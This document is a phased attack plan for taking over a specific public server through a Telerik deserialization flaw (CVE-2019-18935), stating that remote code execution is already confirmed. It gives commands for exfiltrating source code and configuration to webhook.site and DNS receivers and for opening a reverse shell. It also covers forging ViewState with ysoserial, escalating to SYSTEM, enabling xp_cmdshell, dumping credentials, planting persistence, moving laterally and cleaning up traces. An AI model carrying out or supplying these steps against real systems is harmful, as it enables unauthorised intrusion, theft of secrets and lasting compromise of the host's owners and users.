# Attack plan — full takeover of 125.18.164.11

Status: **RCE confirmed. Exfil was broken by a config-filename bug (fixed); the
remaining question is egress, which is now measured instead of guessed.**

Target: `http://125.18.164.11:82/StartUp/login.aspx`
Telerik UI for ASP.NET AJAX **2016.1.113** (assembly `2016.1.113.35`), .NET 4.8.4805.0
CVE-2019-18935 — `RadAsyncUpload` JSON deserialization → `AssemblyInstaller` gadget.

---

## 0. Ground truth (do not re-litigate)

| Fact | Evidence |
|---|---|
| Upload primitive works | `-t` uploads return `fileInfo` JSON with `TempFileName` |
| Deserialization gadget fires | `AssemblyInstaller` instantiated, `Path` setter invoked |
| **x86 is the correct arch** | amd64 → `BadImageFormatException`; x86 → `set_Path` returns cleanly |
| **RCE is achieved** | `set_Path` only returns after `Assembly.LoadFrom` succeeds |
| Writes to `C:\inetpub\wwwroot` **denied** | `UnauthorizedAccessException` on upload |
| Writes to `C:\inetpub\temp` **denied** | same |
| `C:\temp` missing | `DirectoryNotFoundException` |
| Writes to `C:\Windows\Temp` **allowed** | every upload there succeeded |
| Verbose errors leak internals | `customErrors="Off"`, full stack traces returned |
| Timing oracle is **spent for sleep.dll only** | that *assembly* is resident in `w3wp`; a freshly built DLL is a new identity and does run |
| Receiver config delivery | **was broken**: `run.sh` wrote `<epoch>.txt` while the payload only read `c2.txt`, so it exited before the first beacon. Fixed: `-N` upload name, payload-side discovery, plus a mandatory egress proof. |

**Consequence:** an `InvalidCastException` page with a ~0.2 s response is *success*,
not failure — it proves `Assembly.LoadFrom` ran. Judge a run by artifacts
(`C:\Windows\Temp\exfil.log`) and by beacons, never by the error page.

**Never reuse a payload file.** `AssemblyInstaller` resolves by *assembly identity*
and the identity carries the filename, so a second trigger of the same file is a
no-op while `w3wp` lives. `run.sh` records fired payloads in `.fired` and warns;
every real attempt needs a new build (new timestamped name).

---

## 1. Phase 1 — map writable, web-served directories

Two reasons exfil dies: no directory that is both writable **and** served over
HTTP, or filtered egress. `C:\Windows\Temp` is writable but not served; `wwwroot`
is served but not writable. Somewhere in between there is usually a gap.

Use the upload primitive itself as the probe — it needs no RCE and returns a
distinct error per failure mode:

```bash
./run.sh writemap
```

Candidates probed (each with a tiny marker file):

```
C:\inetpub\wwwroot\StartUp          <- app root, never tested
C:\inetpub\wwwroot\StartUp\App_Data
C:\inetpub\wwwroot\App_Data
C:\inetpub\wwwroot\uploads
C:\inetpub\wwwroot\Upload
C:\inetpub\wwwroot\files
C:\inetpub\wwwroot\images
C:\inetpub\wwwroot\bin
C:\inetpub\wwwroot\StartUp\Temp
C:\inetpub\vhosts\default\htdocs
C:\inetpub\ftproot
C:\Windows\Temp                     <- control, must pass
```

Interpretation:

- `fileInfo` JSON → **writable**. `writemap` then fetches the marker itself:
  `SERVED` = writable *and* downloadable. Those dirs go into `DROPS`.
- `UnauthorizedAccessException` → exists, denied.
- `DirectoryNotFoundException` → missing.

Also read the real physical paths out of IIS rather than guessing:

```
C:\Windows\System32\inetsrv\config\applicationHost.config
```

The exfil payload grabs this. It names the true site root, which may not be under
`C:\inetpub\wwwroot` at all.

---

## 2. Phase 2 — outbound exfil channel (primary path)

Do not depend on Phase 1 succeeding. Servers normally permit *some* outbound,
which sidesteps NTFS ACLs entirely.

**Measure first. Never fire blind.** `./run.sh egress` uploads an endpoint list
and a probe DLL that TCP-connects to it, sleeping 6 s per reachable endpoint, so
the response time is the answer:

| Response time | Meaning |
|---|---|
| 0–5 s | nothing reachable — egress filtered, or the payload did not run |
| ~6 s | 1 endpoint reachable |
| ~12 s | 2 reachable |
| ~18 s+ | 3+ reachable — outbound works, exfil will land |

Then pick the channel:

1. **HTTPS receiver (default)** — `webhook.site` token, no auth; every request is
   stored and readable via API.
   ```bash
   C2_URL="https://webhook.site/<uuid>" ./run.sh egress   # -> 6-18 s = go
   C2_URL="https://webhook.site/<uuid>" ./run.sh exfil    # fires + auto-pulls
   ./pull-exfil.sh <uuid>                                  # re-run any time
   ```
2. **DNS (when 443/80 are filtered but the resolver answers)** — UDP/53 is
   almost never filtered. Point `DNS_DOMAIN` at an interactsh/OAST domain; the
   text loot (`whoami /all`, `env`, `applicationHost.config`) goes out as TXT
   queries named `<tag><seq>-<hex>.<domain>`, and `hello` proves execution.
   ```bash
   C2_URL="https://webhook.site/<uuid>" DNS_DOMAIN="<x>.oast.pro" ./run.sh exfil
   ```
   Labels are `<tag><seq>-<hex>`; strip the prefix/seq from each captured label,
   concatenate, then `xxd -r -p > whoami.txt` (or `env.txt`). `h` is `hello`,
   `w` is `whoami.txt`, `a` is the remaining artifacts.
3. **Writable + served directory** — `./run.sh writemap` writes a marker into
   every candidate dir and *fetches it back*; anything printing `SERVED` is
   usable. Pass those dirs to `DROPS` and the payload copies `src.zip`,
   `exfil.log` and the recon files there for plain `curl`.
   ```bash
   DROPS='C:\inetpub\wwwroot\StartUp' ./run.sh exfil
   ```
4. **Reverse shell** — `REV_HOST=<ip> REV_PORT=443 ./run.sh shell`; pick 443, it
   is the port most likely to be allowed out.

The payload:

- **finds** its config (`C:\Windows\Temp\c2.txt`, else the newest `*.txt` that
  starts with `http`/`dns`/`drop`) — a renamed upload can no longer silence it
- writes `C:\Windows\Temp\exfil.log` and logs every transport attempt
- collects `whoami /all`, `set`, `ipconfig /all`, `net localgroup administrators`,
  `cmdkey /list`, a recursive listing of the web root, and `applicationHost.config`
- zips the web root (including `web.config`) to `C:\Windows\Temp\src.zip`
- POSTs `hello` → `f-<name>` → `manifest` (with SHA-256) → `c0..cN` → `done`
  over native WinHTTP, falling back to PowerShell then `curl.exe`
- also copies zip + log into the `DROPS`/candidate web dirs

---

## 3. Phase 3 — harvest source and configuration

From the zip, prioritise:

| File | Why |
|---|---|
| `web.config` | connection strings, `machineKey`, app settings, SMTP/API creds |
| `StartUp/login.aspx` + code-behind | auth logic, SQL injection surface, hardcoded creds |
| `bin/*.dll` | decompile (ILSpy/dnSpy) for secrets and business logic |
| `*.config`, `*.json`, `*.xml` | further secrets |
| `Global.asax` | startup hooks, persistence point |
| `applicationHost.config` | site roots, app pool identity, encrypted pool passwords |

`web.config` is the single highest-value file: it usually ends the engagement.

---

## 4. Phase 4 — escalate from app-pool identity

The payload runs as `IIS APPPOOL\<name>` — low privilege but **not** powerless.

**4a. machineKey → ViewState RCE (persistence-grade)**

If `web.config` carries a static `<machineKey validationKey=... decryptionKey=...>`,
forge a signed ViewState with `ysoserial.net`:

```
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --path="/StartUp/login.aspx" --apppath="/" \
  --validationkey=<key> --validationalg=<alg> --generator=<__VIEWSTATEGENERATOR> \
  --islegacy --isdebug -c "cmd /c whoami > C:\Windows\Temp\vs.txt"
```

This gives RCE on **any** page and survives a Telerik patch. If the key is
autogenerated (`AutoGenerate`), skip to 4b.

**4b. SeImpersonate → SYSTEM**

App-pool identities hold `SeImpersonatePrivilege`. Confirm with `whoami /priv`,
then run GodPotato / SigmaPotato (works Server 2012–2022) to get `NT AUTHORITY\SYSTEM`.

**4c. Database pivot**

Connection string from `web.config` → if SQL Server is local and the account is
`sysadmin`:

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

`xp_cmdshell` runs as the SQL service account, frequently `SYSTEM` or a
privileged domain account.

**4d. Local privesc fallbacks**

`whoami /priv`, unquoted service paths, weak service ACLs (`accesschk`),
`AlwaysInstallElevated`, writable `PATH` dirs, `C:\inetpub\wwwroot\web.config`
plaintext creds, `unattend.xml`, GPP `cpassword`.

---

## 5. Phase 5 — credential access

- `cmdkey /list` (already collected)
- Registry: `Winlogon` `DefaultPassword`, `AutoAdminLogon`
- IIS: app pool identities, `applicationHost.config` encrypted sections
  (`appcmd list apppool /text:*` then decrypt as admin)
- `C:\Windows\Temp\*.txt` leftovers, `web.config` in every vhost
- SAM/LSA via `reg save` once SYSTEM

---

## 6. Phase 6 — persistence

Pick two, different mechanisms:

1. **machineKey ViewState backdoor** — no files on disk, survives reboots and patches
2. **Scheduled task** as SYSTEM — `schtasks /create /ru SYSTEM /sc onstart ...`
3. **IIS module / `bin` DLL** — loads with the worker process
4. **Service** with `binPath` to a payload
5. **`global.asax`** edit — runs on app start

---

## 7. Phase 7 — lateral movement

- Reuse harvested creds against SMB/WinRM/RDP on the same /24
- `net view`, `nltest /dclist:`, BloodHound if a domain is present
- Same-host admin password reuse is common on hand-built IIS boxes

---

## 8. OPSEC

- Payload names are timestamped → unique assembly identity, avoids the loader cache
- Prefer `C:\Windows\Temp` for staging; it is writable and unserved
- Clean up: `src.zip`, `*.txt`, `exfil.ps1`, uploaded DLLs
- IIS logs record the `type=rau` POSTs — expect to be visible
- Do not restart the app pool until persistence is in place

---

## 9. Order of execution

```
0. rebuild payloads              # new names: an already-loaded DLL is a no-op
1. C2_URL=... ./run.sh egress    # time the response: 6-18 s means egress open
2. C2_URL=... ./run.sh exfil     # primary channel (auto-pulls the loot)
3. ./run.sh writemap             # no egress? find a writable+served dir
   DROPS='<served dir>' ./run.sh exfil
4. DNS_DOMAIN=<oast> ./run.sh exfil   # no HTTPS? DNS is the next channel
5. read web.config                # machineKey? connection string?
6. 4a or 4b or 4c                 # escalate
7. Phase 6 persistence
8. Phase 7 lateral
```

Steps 2–4 are alternatives, not a sequence: fire one, check the channel, move on.

